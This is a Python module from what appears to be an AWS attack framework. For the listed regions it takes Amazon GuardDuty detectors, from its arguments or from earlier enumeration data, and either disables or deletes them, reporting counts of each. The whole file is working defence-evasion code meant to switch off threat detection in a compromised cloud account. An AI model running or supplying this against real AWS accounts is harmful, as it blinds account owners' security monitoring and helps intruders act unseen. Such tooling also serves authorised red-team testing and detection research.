#!/usr/bin/env python3
import datetime

import argparse
from copy import deepcopy


def main(args, awsattack_main, data=None):
    technique_info = data
    session = awsattack_main.get_active_session()
    
    print = awsattack_main.print
    fetch_data = awsattack_main.fetch_data
    get_regions = awsattack_main.get_regions

    gd_regions = get_regions('guardduty')

    detectors = []

    summary_data = {}

    # If any arguments are passed in, that that means to not check the database
    # to see if we need to enumerate stuff

    if args.detectors is not None:
        gd_regions = set()
        for detector in args.detectors.split(','):
            id, region = detector.split('@')
            detectors.append({
                'Id': id,
                'Region': region
            })
            gd_regions.add(region)

    else:
        guardduty_data = deepcopy(session.GuardDuty)

        if 'Detectors' not in guardduty_data:
            if fetch_data(['Logging/Monitoring Data'], technique_info['prerequisite_modules'][0], None) is False:
                print('Pre-req module not run successfully. Only targeting services that currently have valid data...\n')
            else:
                detectors = deepcopy(session.GuardDuty['Detectors'])
        else:
            detectors = guardduty_data['Detectors']

    if len(detectors) > 0:
        print('Starting GuardDuty...\n')
        summary_data['guardduty'] = {
            'disabled': 0,
            'deleted': 0,
        }
        for region in gd_regions:
            print('  Starting region {}...\n'.format(region))

            client = awsattack_main.get_boto3_client('guardduty', region)

            for detector in detectors:
                if detector['Region'] == region:
                    action = args.action.lower()

                    if action == 'dis':
                        try:
                            client.update_detector(
                                DetectorId=detector['Id'],
                                Enable=False
                            )
                            print('        Successfully disabled detector {}!\n'.format(detector['Id']))
                            summary_data['guardduty']['disabled'] += 1
                        except Exception as error:
                            print('        Could not disable detector {}:\n      {}\n'.format(detector['Id'], error))

                    elif action == 'del':
                        try:
                            client.delete_detector(
                                DetectorId=detector['Id']
                            )
                            print('        Successfully deleted detector {}!\n'.format(detector['Id']))
                            summary_data['guardduty']['deleted'] += 1
                        except Exception as error:
                            print('        Could not delete detector {}:\n      {}\n'.format(detector['Id'], error))

                    else:
                        print('    Skipping detector {}...\n'.format(detector['Id']))

        print('GuardDuty finished.\n')

    else:
        print('No detectors found. Skipping GuardDuty...\n')

